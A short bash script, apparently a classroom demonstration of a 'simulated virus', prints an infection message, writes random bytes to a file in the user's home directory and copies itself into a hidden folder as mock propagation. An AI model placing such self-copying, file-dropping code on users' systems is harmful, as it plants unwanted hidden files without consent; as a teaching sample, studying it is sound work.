#!/bin/bash

echo "¡Tu sistema está infectado! 😈"

## payload simulado
dd if=/dev/urandom of=$HOME/infectado.txt bs=512 count=1

## propagacion
mkdir $HOME/.infectado
cp $(realpath "$0") $HOME/.infectado


